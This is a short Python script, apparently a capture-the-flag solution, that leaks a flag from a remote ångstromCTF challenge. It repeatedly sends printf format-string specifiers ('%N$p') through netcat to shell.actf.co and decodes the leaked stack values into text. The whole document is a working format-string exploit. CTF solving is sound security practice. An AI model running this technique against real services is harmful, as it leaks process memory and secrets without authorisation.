import re
import subprocess

i = 1
while True:
    result = subprocess.check_output(f"echo '%{i}$p' | nc shell.actf.co 21820", shell=True)
    if not (b"nil" in result):
        result = result.replace(b"Name: \nWelcome, ", b"").replace(b"\n", b"")
        result = result.replace(b"0x", b"").decode()[::-1]
        result = re.split('(..)', result)[1::2]
        for j in result:
            print(chr(int(j[::-1], 16)), end="")
        if "d7" in result:# 0x7d = }
            break
    i += 1